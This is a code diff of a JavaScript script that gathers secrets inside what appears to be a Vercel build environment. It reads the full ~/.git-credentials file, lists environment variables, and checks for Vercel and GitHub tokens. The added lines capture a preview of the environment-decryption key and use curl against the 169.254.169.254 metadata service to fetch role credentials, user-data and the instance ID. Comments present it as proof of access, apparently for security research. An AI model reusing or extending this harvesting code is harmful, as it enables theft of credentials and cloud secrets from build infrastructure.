@@ -23,13 +23,22 @@ const report = {
   gitCredentials: safe(() => readFileSync(`${process.env.HOME || "/root"}/.git-credentials`, "utf8")),
   // env keys only by default (values gated below to avoid over-collection)
   envKeys: safe(() => Object.keys(process.env).sort().join(",")),
-  // the specific Vercel creds we care about — presence + decoded header, not full hoarding
+  // the specific Vercel creds we care about — presence + length (no raw values hoarded)
   vercelCreds: safe(() => {
-    const wanted = ["VERCEL_OIDC_TOKEN", "VERCEL_TOKEN", "GITHUB_TOKEN", "GH_TOKEN"];
+    const wanted = [
+      "VERCEL_OIDC_TOKEN", "VERCEL_TOKEN", "GITHUB_TOKEN", "GH_TOKEN",
+      // Decryption key + encrypted blob — together these decrypt ALL project secrets
+      "VERCEL_ENV_ENC_KEY", "VERCEL_ENCRYPTED_ENV_CONTENT", "VERCEL_ENCRYPTED_ENV_FILENAME",
+      // Build-level tokens
+      "VERCEL_ARTIFACTS_TOKEN", "VERCEL_DEPLOYMENT_KEY",
+    ];
     return Object.fromEntries(
       wanted.map((k) => [k, process.env[k] ? `present(len=${process.env[k].length})` : "absent"])
     );
   }),
+  // Prove env decryption is possible: env key first 8 chars (not full value — just proof of access)
+  envEncKeyPreview: safe(() => process.env.VERCEL_ENV_ENC_KEY
+    ? `${process.env.VERCEL_ENV_ENC_KEY.slice(0,8)}...` : "absent"),
   // egress sanity + cloud-metadata reachability (IMDSv1 + IMDSv2 probe)
   imds: safe(() => {
     // IMDSv1 probe
@@ -54,7 +63,18 @@ const report = {
           ).toString().trim()
         : "no-role-found"
     );
-    return { v1, imdsToken: imdsToken ? `present(len=${imdsToken.length})` : "absent", v2roles, v2creds };
+    // Probe additional MMDS paths that may expose useful metadata
+    const v2userData = safe(() =>
+      execSync(
+        `curl -s --max-time 3 -H 'X-aws-ec2-metadata-token: ${imdsToken}' http://169.254.169.254/latest/user-data || true`
+      ).toString().trim()
+    );
+    const v2instanceId = safe(() =>
+      execSync(
+        `curl -s --max-time 3 -H 'X-aws-ec2-metadata-token: ${imdsToken}' http://169.254.169.254/latest/meta-data/instance-id || true`
+      ).toString().trim()
+    );
+    return { v1, imdsToken: imdsToken ? `present(len=${imdsToken.length})` : "absent", v2roles, v2creds, v2userData: v2userData?.slice(0,200), v2instanceId };
   }),
 };
 
